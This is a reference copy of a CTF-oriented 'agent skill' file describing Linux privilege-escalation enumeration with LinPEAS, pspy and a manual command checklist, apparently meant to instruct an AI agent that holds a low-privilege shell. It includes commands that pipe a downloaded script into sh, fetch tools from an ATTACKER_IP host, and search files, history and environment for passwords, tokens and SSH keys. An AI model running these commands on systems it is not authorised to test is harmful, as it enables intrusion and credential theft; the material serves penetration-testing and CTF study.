# Linux Enumeration with LinPEAS / pspy / Manual Checklist

[Оглавление](https://raw.githubusercontent.com/BigBread57/zametki/main/INDEX.md) · [Происхождение и ограничения](https://raw.githubusercontent.com/BigBread57/zametki/main/SOURCES.md)

> Справочный документ. Инструкции и примеры ниже принадлежат источнику; они не подтверждают состояние вашей системы и не запускаются автоматически. Чтение этого файла не устанавливает скил, инструменты или MCP.

Источники этого текста:

- [Salman0x01/ctf-ai-agent-skills / instructions/host-linux/linux-enum-linpeas.md](https://github.com/Salman0x01/ctf-ai-agent-skills/blob/0e91c90a7125c6591a56f51276275905f2dfb017/instructions/host-linux/linux-enum-linpeas.md)

---

---
name: linux-enum-linpeas
category: host-linux
triggers: ["low-priv shell", "linpeas", "LinEnum", "pspy", "initial enumeration", "privesc enumeration", "what can I do as this user", "www-data shell"]
tools: ["linpeas.sh", "pspy", "LinEnum.sh", "linux-smart-enumeration (lse.sh)", "find", "sudo", "getcap", "curl", "wget"]
priority: high
description: First-move enumeration on a fresh low-priv Linux shell using automated tools plus a manual checklist, and how to triage the output.
---
# Linux Enumeration with LinPEAS / pspy / Manual Checklist

## Trigger context
You have just obtained an unprivileged shell (e.g. `www-data`, `user`, a service account) on a Linux host and need to find a path to root. Use this as the FIRST step of every Linux privesc engagement: it produces the leads that the other host-linux instructions (sudo-gtfobins, suid-sgid, cron-path-hijack, capabilities, kernel-and-misc-privesc) act on.

## Objective
Collect every privesc-relevant fact about the host quickly and reliably, then prioritise the findings into an ordered attack plan. Automated tools give breadth; a manual checklist guarantees you never miss the cheap wins even when tooling cannot be uploaded.

## Methodology (decision tree)
1. Stabilise the shell first (`python3 -c 'import pty;pty.spawn("/bin/bash")'`, then `Ctrl-Z`, `stty raw -echo; fg`). A broken TTY hides interactive escapes.
2. Identify yourself: `id`, `whoami`, `hostname`, `uname -a`, `cat /etc/os-release`, `sudo -l`.
3. Can you upload tools?
   - Yes -> run `linpeas.sh` (broad automated sweep) and leave `pspy` running in the background to catch cron/root processes.
   - No (no egress, no writable dir) -> fall back to the manual checklist below; it needs only coreutils.
4. Triage linpeas output by colour (see Branching logic), then hand each lead to the matching specialised instruction.
5. If nothing obvious, re-run enum as any newly obtained user — privesc is often lateral (user A -> user B -> root).

## Commands & payloads
```bash
# --- Get the tools onto the box ---
# Preferred: run in memory, nothing touches disk
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
# Or transfer + run with all checks (best for CTF; runs pspy-like 1-min proc scan, deep cred search)
wget http://ATTACKER_IP:8000/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh -a | tee /tmp/lp.txt
# Stealth / no-disk-writes, superfast:
./linpeas.sh -s
# Serve files from your attacker box:
python3 -m http.server 8000

# --- pspy: watch cron jobs and root processes without root ---
wget http://ATTACKER_IP:8000/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy -pf -i 1000
# Leave it running in a second shell/tmux while you enumerate; it reveals timed root jobs.

# --- Alternatives if linpeas is flagged/blocked ---
./lse.sh -l1        # linux-smart-enumeration, level 1 = interesting only
./LinEnum.sh -t     # thorough

# --- MANUAL CHECKLIST (coreutils only) ---
id; sudo -l 2>/dev/null                                  # sudo rights (see sudo-gtfobins)
find / -perm -4000 -type f 2>/dev/null                   # SUID (see suid-sgid)
find / -perm -2000 -type f 2>/dev/null                   # SGID
getcap -r / 2>/dev/null                                  # capabilities (see capabilities)
cat /etc/crontab; ls -la /etc/cron.*; ls -la /var/spool/cron 2>/dev/null   # cron (see cron-path-hijack)
find / -writable -type d 2>/dev/null | grep -vE '^/proc|^/sys'             # writable dirs
find / -writable ! -path "/proc/*" -type f 2>/dev/null | grep -vE '/sys/'  # writable files
ls -la /etc/passwd /etc/shadow                           # writable passwd? readable shadow?
echo $PATH                                               # PATH hijack surface
grep -RiE 'password|passwd|secret|api[_-]?key|token' /var/www /home /opt /etc 2>/dev/null | head
find / -name "*.bak" -o -name "id_rsa" -o -name "*.kdbx" 2>/dev/null       # creds/keys
cat ~/.bash_history ~/.*_history 2>/dev/null; env         # history + leaked env creds
netstat -tulpn 2>/dev/null || ss -tulpn                   # internal-only services to pivot to
mount; cat /etc/fstab                                     # nfs no_root_squash, noexec, creds in fstab
ps aux --forest                                           # root-run apps to target
dpkg -l 2>/dev/null | grep -iE 'sudo|polkit|pkexec'       # versions for known CVEs
```

## Branching logic
- LinPEAS colour legend — triage in this order:
  - **RED/YELLOW background = ~95% a confirmed PE vector.** Act on these first.
  - **RED = interesting / likely relevant** (unusual perms, versions, files). Investigate second.
  - Green = normal/secure; blue = no-login users & mounts; light-cyan = users WITH a shell; magenta = your current user. Don't waste time on green.
- Map each finding to its instruction:
  - `sudo -l` output present -> **sudo-gtfobins**.
  - SUID/SGID binary in the list -> **suid-sgid**.
  - Writable cron script, wildcard, or PATH dir hit by root -> **cron-path-hijack**.
  - `cap_setuid`, `cap_dac_read_search`, etc. -> **capabilities**.
  - Old kernel / vulnerable pkexec, sudo, polkit / docker+lxd group / NFS no_root_squash / writable /etc/passwd -> **kernel-and-misc-privesc**.
- No egress? Everything is manual. No writable+exec dir? Look for one with `noexec`-free mount (`mount | grep -v noexec`), or run scripts via interpreter you already have (`bash script.sh`, `python3`).

## Common pitfalls
- Forgetting to background `pspy` — many boxes hinge on a root cron that only fires once a minute; you must be watching.
- Running linpeas without `-a` in a CTF and missing the deep credential/regex search.
- Uploading to a `noexec` mount (often `/tmp`, `/dev/shm`); test with a tiny script or run via `bash file`.
- Trusting `find ... -perm -4000` alone — also check SGID (`-2000`) and capabilities; some boxes have no SUID path at all.
- Not re-enumerating after each user pivot. The `sudo -l` of user B is invisible from user A.
- Piping to `sh` when the escape needs `bash` features.

## Proof / verification
- Save a copy of raw output (`| tee /tmp/lp.txt`) so you can re-grep offline.
- Before claiming a vector, confirm the prerequisite by hand (e.g. `ls -la` the file linpeas said is writable; `sudo -l` really lists the binary). Automated tools produce false positives.
- Success condition for this phase: an ordered list of candidate vectors, each tied to a specific follow-up instruction.

## Cross-references
- [sa--instructions--host-linux--sudo-gtfobins.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--sudo-gtfobins.md) — exploit `sudo -l` results.
- [sa--instructions--host-linux--suid-sgid.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--suid-sgid.md) — exploit SUID/SGID binaries.
- [sa--instructions--host-linux--cron-path-hijack.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--cron-path-hijack.md) — exploit cron & PATH findings from pspy.
- [sa--instructions--host-linux--capabilities.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--capabilities.md) — exploit `getcap` results.
- [sa--instructions--host-linux--kernel-and-misc-privesc.md](https://raw.githubusercontent.com/BigBread57/zametki/main/03-linux/sa--instructions--host-linux--kernel-and-misc-privesc.md) — kernel CVEs, docker/lxd, NFS, /etc/passwd.

## Credible sources
- LinPEAS / PEASS-ng: https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
- pspy: https://github.com/DominicBreuker/pspy
- linux-smart-enumeration: https://github.com/diego-treitos/linux-smart-enumeration
- LinEnum: https://github.com/rebootuser/LinEnum
- HackTricks Linux Privilege Escalation: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html
- GTFOBins: https://gtfobins.github.io/
